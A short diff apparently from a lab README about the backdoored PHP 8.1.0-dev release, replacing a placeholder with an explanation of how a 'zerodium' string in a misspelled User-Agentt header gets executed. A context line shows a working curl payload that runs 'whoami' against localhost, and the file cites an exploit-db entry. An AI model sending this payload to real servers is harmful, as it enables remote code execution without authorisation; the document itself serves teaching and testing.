@@ -11,7 +11,7 @@ curl -H "User-Agentt: zerodiumsystem('whoami');" http://localhost:8080
 
 
 ### Explanation
-This happens costam
+The backdoor looks for existence of malformed user-agent header. If it contains string "zerodium", then anything that comes after it will be executed.
 
 ### References and recommended reading
 https://www.exploit-db.com/exploits/49933
